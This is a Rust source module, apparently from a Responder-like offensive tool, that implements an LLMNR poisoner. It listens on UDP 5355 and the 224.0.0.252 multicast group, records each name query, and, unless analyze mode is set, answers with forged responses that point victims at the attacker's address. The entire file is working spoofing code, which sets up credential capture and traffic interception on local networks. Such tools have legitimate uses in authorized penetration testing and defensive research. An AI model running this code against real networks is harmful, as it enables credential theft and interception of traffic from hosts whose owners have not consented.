//! LLMNR poisoner (RFC 4795). Listens on UDP 5355 / multicast 224.0.0.252 and answers name
//! queries with our address.

use std::net::{Ipv4Addr, SocketAddr};
use std::sync::Arc;

use hickory_proto::op::{Message, MessageType};

use crate::capture::CaptureSink;
use crate::capture::model::Protocol;
use crate::constants::LLMNR_MCAST_V4;
use crate::logger::Logger;

use super::{PoisonConfig, dns_response, query_event};

/// Run the LLMNR poisoner until the socket fails or the task is aborted.
pub async fn run(
    bind: SocketAddr,
    iface_ip: Ipv4Addr,
    cfg: Arc<PoisonConfig>,
    sink: CaptureSink,
    logger: Arc<Logger>,
) -> anyhow::Result<()> {
    let sock = super::bind_udp(bind, true, Some((LLMNR_MCAST_V4, iface_ip)))?;
    logger.info(&format!("LLMNR poisoned on {bind}"));
    let mut buf = vec![0u8; 65535];
    loop {
        let (n, src) = sock.recv_from(&mut buf).await?;
        let Ok(msg) = Message::from_vec(&buf[..n]) else {
            continue;
        };
        if msg.metadata.message_type != MessageType::Query
            || msg.metadata.op_code != hickory_proto::op::OpCode::Query
        {
            continue;
        }
        // Self-poison guard: never answer ourselves.
        if src.ip() == std::net::IpAddr::V4(cfg.answer_ipv4) {
            continue;
        }
        let answered = !cfg.analyze;
        for q in &msg.queries {
            let name = q.name().to_utf8();
            sink.query(query_event(
                Protocol::Llmnr,
                src.ip(),
                &name,
                &format!("{:?}", q.query_type()),
                answered,
                cfg.analyze,
            ));
        }
        if !cfg.analyze {
            let resp = dns_response(&msg, &cfg);
            if let Ok(bytes) = resp.to_vec() {
                let _ = sock.send_to(&bytes, src).await;
            }
        }
    }
}
